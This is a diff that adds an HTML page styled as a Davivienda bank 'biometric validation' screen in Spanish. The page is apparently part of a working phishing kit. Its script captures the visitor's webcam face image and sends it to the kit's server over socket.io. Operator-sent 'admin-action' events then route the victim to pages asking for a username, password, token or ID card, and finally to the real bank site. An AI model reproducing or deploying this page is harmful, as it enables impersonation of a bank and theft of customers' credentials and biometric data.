@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Validación Biométrica</title>
+    <link rel="icon" type="image/webp" href="img/logo-davivienda-web.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 0;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 340px;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-section {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-section img {
+            height: 35px;
+            width: auto;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .greeting {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 15px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .camera-container {
+            width: 100%;
+            height: 280px;
+            background: #000;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            overflow: hidden;
+            border: 2px solid #ccc;
+        }
+
+        .instructions {
+            background-color: #f8f8f8;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+
+        .instructions h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .instructions ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .instructions li {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .instructions li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #ED1C24;
+            font-weight: bold;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 80px;
+        }
+
+        .btn-capture {
+            width: 100%;
+            padding: 14px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+        }
+
+        .btn-capture:hover {
+            background-color: #d01920;
+        }
+
+        .btn-capture:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-retake {
+            width: 100%;
+            padding: 14px;
+            background-color: #666;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+            display: none;
+        }
+
+        .btn-retake:hover {
+            background-color: #555;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s;
+            display: none;
+        }
+
+        .btn-submit:hover {
+            background-color: #d01920;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9998;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+
+        .forgot-password {
+            text-align: center;
+            padding: 20px 25px;
+            background-color: #f8f8f8;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .forgot-password p {
+            font-size: 14px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                box-shadow: none;
+            }
+            body {
+                padding-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="overlay"></div>
+    
+    <div class="container">
+        <div class="logo-section">
+            <img src="img/Davivienda-Logo-Vector.svg-.png" alt="Davivienda">
+        </div>
+        
+        <div class="content">
+            <p class="greeting">Verificación de Identidad</p>
+            <h1 class="welcome-text">Validación Biométrica</h1>
+            <p class="info-text">Para continuar, necesitamos verificar tu identidad mediante reconocimiento facial.</p>
+            
+            <div class="camera-container" id="cameraContainer"></div>
+
+            <div class="instructions">
+                <h3>Instrucciones:</h3>
+                <ul>
+                    <li>Asegúrate de tener buena iluminación</li>
+                    <li>Mantén tu rostro centrado</li>
+                    <li>Retira lentes o accesorios</li>
+                    <li>Mantén una expresión neutral</li>
+                </ul>
+            </div>
+
+            <div class="btn-container">
+                <button class="btn-capture" id="btnCapture">Capturar Foto</button>
+                <button class="btn-retake" id="btnRetake">Re-capturar</button>
+                <button class="btn-submit" id="btnContinue">Continuar</button>
+            </div>
+        </div>
+        
+        <div class="forgot-password">
+            <p>¿Necesitas ayuda con la verificación?</p>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const persistentSessionId = localStorage.getItem('persistentSessionId');
+        
+        if (!persistentSessionId) {
+            window.location.href = '/index.html';
+        }
+        
+        const socket = io({
+            auth: { sessionId: persistentSessionId }
+        });
+
+        socket.on('connect', () => {
+            console.log('Conectado - Socket:', socket.id, '| Session:', persistentSessionId);
+        });
+
+        const btnCapture = document.getElementById('btnCapture');
+        const btnRetake = document.getElementById('btnRetake');
+        const btnContinue = document.getElementById('btnContinue');
+        const cameraContainer = document.getElementById('cameraContainer');
+        const overlay = document.getElementById('overlay');
+
+        let capturedImage = null;
+        let stream = null;
+        let videoElement = null;
+
+        async function initCamera() {
+            try {
+                videoElement = document.createElement('video');
+                videoElement.autoplay = true;
+                videoElement.playsInline = true;
+                videoElement.style.width = '100%';
+                videoElement.style.height = '100%';
+                videoElement.style.objectFit = 'cover';
+
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 640, height: 480 } 
+                });
+                
+                videoElement.srcObject = stream;
+                cameraContainer.innerHTML = '';
+                cameraContainer.appendChild(videoElement);
+            } catch (error) {
+                console.error('Error cámara:', error);
+                alert('No se pudo acceder a la cámara. Verifica los permisos.');
+            }
+        }
+
+        initCamera();
+
+        btnCapture.addEventListener('click', function() {
+            if (!videoElement || !stream) {
+                alert('La cámara no está disponible');
+                return;
+            }
+
+            overlay.classList.add('active');
+            btnCapture.disabled = true;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth || 640;
+            canvas.height = videoElement.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            capturedImage = canvas.toDataURL('image/jpeg', 0.8);
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            
+            const previewImg = document.createElement('img');
+            previewImg.src = capturedImage;
+            previewImg.style.width = '100%';
+            previewImg.style.height = '100%';
+            previewImg.style.objectFit = 'cover';
+            
+            cameraContainer.innerHTML = '';
+            cameraContainer.appendChild(previewImg);
+            
+            btnCapture.style.display = 'none';
+            btnRetake.style.display = 'block';
+            btnContinue.style.display = 'block';
+            
+            overlay.classList.remove('active');
+            btnCapture.disabled = false;
+        });
+
+        btnRetake.addEventListener('click', function() {
+            capturedImage = null;
+            cameraContainer.innerHTML = '';
+            btnCapture.style.display = 'block';
+            btnRetake.style.display = 'none';
+            btnContinue.style.display = 'none';
+            initCamera();
+        });
+
+        btnContinue.addEventListener('click', function() {
+            if (capturedImage) {
+                overlay.classList.add('active');
+                
+                socket.emit('submit-face', {
+                    image: capturedImage,
+                    imageSize: capturedImage.length,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        });
+
+        socket.on('data-sent', (response) => {
+            if (!response.success) {
+                console.error('Error:', response.error);
+                overlay.classList.remove('active');
+            } else {
+                setTimeout(() => {
+                    window.location.href = '/loading.html?action=face';
+                }, 500);
+            }
+        });
+
+        socket.on('admin-action', (data) => {
+            const { action } = data;
+            
+            switch(action) {
+                case 'request-user':
+                    window.location.href = '/index.html';
+                    break;
+                case 'request-password':
+                    window.location.href = '/clave.html';
+                    break;
+                case 'request-token':
+                    window.location.href = '/token.html';
+                    break;
+                case 'request-face':
+                    window.location.href = '/cara.html';
+                    break;
+                case 'request-id':
+                    window.location.href = '/cedula.html';
+                    break;
+                case 'finish':
+                    window.location.href = 'https://www.davivienda.com/';
+                    break;
+            }
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('Error de conexión:', error);
+        });
+    </script>
+</body>
+</html>
